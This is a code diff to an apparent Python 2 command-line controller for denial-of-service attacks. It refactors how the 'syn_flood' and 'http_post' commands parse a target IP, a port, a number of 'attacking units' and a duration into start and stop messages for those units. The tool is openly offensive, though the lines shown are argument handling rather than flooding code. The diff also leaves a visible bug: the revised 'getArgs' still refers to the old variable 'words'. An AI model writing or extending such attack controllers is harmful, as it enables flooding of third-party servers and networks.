@@ -14,6 +14,18 @@ class my_prompt(Cmd):
     def handler(self, signum, frame):
         self.do_exit('')
 
+    def get_args(self, args):
+        iN = args.index('-n') + 1
+        int(args[iN])
+
+        iPort = args.index('-port') + 1
+        int(args[iPort])
+
+        iIP = args.index('-ip') + 1
+        socket.inet_pton(socket.AF_INET, args[iIP])
+
+        return args[iN] + ";" + args[iPort] + ";" + args[iIP]
+
     def default(self, line):
         print "Invalid command. Try help for more information"
 
@@ -27,10 +39,17 @@ class my_prompt(Cmd):
         raise SystemExit
 
     def do_syn_flood(self, args):
-        """Compulsory flags to begin an attack:
-                -port <[int] destination port>
-                -ip <[ipv4] destination ip>
-                -n <[int] number of attacking units>"""
+        """
+        Necessary flags:
+        \t-start
+        or
+        \t-stop\n
+        Compulsory flags to begin an attack:
+        \t-port <[int] destination port>
+        \t-ip <[ipv4] destination ip>
+        \t-n <[int] number of attacking units>\n
+        Flag:
+        \t-time <[int] attack period in seconds>"""
         args = args.split(' ')
         error = False
 
@@ -38,24 +57,19 @@ class my_prompt(Cmd):
             if '-start' in args:
                 body = 'syn-flood;start;'
 
-                if '-n' in args:
-                    iN = args.index('-n') + 1
-                    body += args[iN] + ";"
-                else:
+                try:
+                    body += self.get_args(args)
+                except:
                     error = True
-                if '-port' in args:
-                    iPort = args.index('-port') + 1
-                    body += args[iPort] + ";"
-                else:
-                    error = True
-                if '-ip' in args:
-                    iIP = args.index('-ip') + 1
-                    body += args[iIP]
-                else:
-                    error = True
+
                 if '-time' in args:
-                    i = args.index('-time') + 1
-                    body += ";" + args[i]
+                    try:
+                        i = args.index('-time') + 1
+                        int(args[i])
+                        body += ";" + args[i]
+                    except:
+                        error = True
+
 
             elif '-stop' in args:
                 body = 'syn-flood;stop'
@@ -71,10 +85,17 @@ class my_prompt(Cmd):
 
 
     def do_http_post(self, args):
-        """Compulsory flags to begin an attack:
-        -port <[int] destination port>
-        -ip <[ipv4] destination ip>
-        -n <[int] number of attacking units>"""
+        """
+        Necessary flags:
+        \t-start
+        or
+        \t-stop\n
+        Compulsory flags to begin an attack:
+        \t-port <[int] destination port>
+        \t-ip <[ipv4] destination ip>
+        \t-n <[int] number of attacking units>\n
+        Flag:
+        \t-time <[int] attack period in seconds>"""
         args = args.split(' ')
         error = False
 
@@ -82,24 +103,19 @@ class my_prompt(Cmd):
             if '-start' in args:
                 body = 'http-post;start;'
 
-                if '-n' in args:
-                    iN = args.index('-n') + 1
-                    body += args[iN] + ";"
-                else:
+                try:
+                    body += self.get_args(args)
+                except:
+                    print "deu bosta"
                     error = True
-                if '-port' in args:
-                    iPort = args.index('-port') + 1
-                    body += args[iPort] + ";"
-                else:
-                    error = True
-                if '-ip' in args:
-                    iIP = args.index('-ip') + 1
-                    body += args[iIP]
-                else:
-                    error = True
+
                 if '-time' in args:
-                    i = args.index('-time') + 1
-                    body += ";" + args[i]
+                    try:
+                        i = args.index('-time') + 1
+                        int(args[i])
+                        body += ";" + args[i]
+                    except:
+                        error = True
 
             elif '-stop' in args:
                 body = 'http-post;stop'
@@ -136,14 +152,14 @@ def printHelp():
     print "\n Exit"
     print "    exit()"
 
-def getArgs(words):
-    iN = words.index('-n') + 1
-    int(words[iN])
+def getArgs(args):
+    iN = args.index('-n') + 1
+    int(args[iN])
 
-    iPort = words.index('-port') + 1
-    int(words[iPort])
+    iPort = args.index('-port') + 1
+    int(args[iPort])
 
-    iIP = words.index('-ip') + 1
+    iIP = args.index('-ip') + 1
     socket.inet_pton(socket.AF_INET, words[iIP])
 
     return words[iN] + ";" + words[iPort] + ";" +  words[iIP]
